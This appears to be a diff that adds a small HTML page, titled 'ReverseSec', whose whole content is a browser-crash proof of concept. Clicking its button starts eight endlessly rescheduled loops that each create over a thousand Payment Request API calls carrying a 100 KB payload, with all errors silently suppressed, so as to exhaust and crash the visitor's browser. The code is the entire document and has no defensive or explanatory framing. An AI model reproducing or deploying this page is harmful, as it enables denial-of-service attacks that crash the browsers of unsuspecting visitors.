@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ReverseSec</title>
+</head>
+<body>
+    <button onclick="crash()">clickme</button>
+
+    <script>
+        function crash() {
+
+            const xpayload = "f".repeat(1024 * 100); 
+            const skibidi = [{
+                supportedMethods: "https://reversesec.org/",
+                data: {
+                    payload: xpayload 
+                }
+            }];
+
+            const sigma = {
+                total: {
+                    label: "Total",
+                    amount: { value: "1337", currency: "USD" }
+                }
+            };
+
+
+            function populate() {
+
+                for (let i = 0; i < 1337; i++) { // increase this shit
+                    try {
+                        const request = new PaymentRequest(skibidi, sigma);
+                        request.show().catch(() => {}); 
+                    } catch (e) {}
+                }
+                setTimeout(populate, 0);
+            }
+            for (let i = 0; i < 8; i++) populate();
+        }
+    </script>
+</body>
+</html>
